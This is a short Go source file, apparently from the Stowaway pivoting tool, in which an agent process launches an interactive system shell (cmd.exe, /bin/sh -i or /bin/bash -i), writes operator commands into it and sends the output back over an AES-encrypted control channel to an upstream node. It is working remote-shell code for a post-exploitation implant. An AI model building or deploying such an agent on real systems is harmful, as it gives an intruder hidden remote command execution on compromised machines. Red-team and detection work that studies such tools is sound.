package agent

import (
	"Stowaway/common"
	"fmt"
	"io"
	"os/exec"
	"runtime"
)

//创建交互式shell
func CreatInteractiveShell() (io.Reader, io.Writer) {
	var cmd *exec.Cmd
	sys := common.CheckSystem()
	switch sys {
	case 0x01:
		cmd = exec.Command("c:\\windows\\system32\\cmd.exe")
	default:
		cmd = exec.Command("/bin/sh", "-i")
		if runtime.GOARCH == "386" || runtime.GOARCH == "amd64" {
			cmd = exec.Command("/bin/bash", "-i")
		}
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		fmt.Println(err)
	}
	stdin, err := cmd.StdinPipe()
	if err != nil {
		fmt.Println(err)
	}
	cmd.Stderr = cmd.Stdout //将stderr连接至stdout
	cmd.Start()
	return stdout, stdin
}

//启动shell
func StartShell(command string, stdin io.Writer, stdout io.Reader, currentid uint32) {
	buf := make([]byte, 1024)
	stdin.Write([]byte(command))
	for {
		count, err := stdout.Read(buf)
		if err != nil {
			//fmt.Println("error: ", err)
			return
		}
		respShell, err := common.ConstructCommand("SHELLRESP", string(buf[:count]), 0, AESKey) //放在控制信道回传，保证在数据信道拥挤时，命令依然可以快速执行与回显
		//respShell, err := common.ConstructDataResult(0, 0, " ", dataType, string(buf[:count]), AESKey, currentid)
		LowerNodeCommChan <- respShell
	}
}
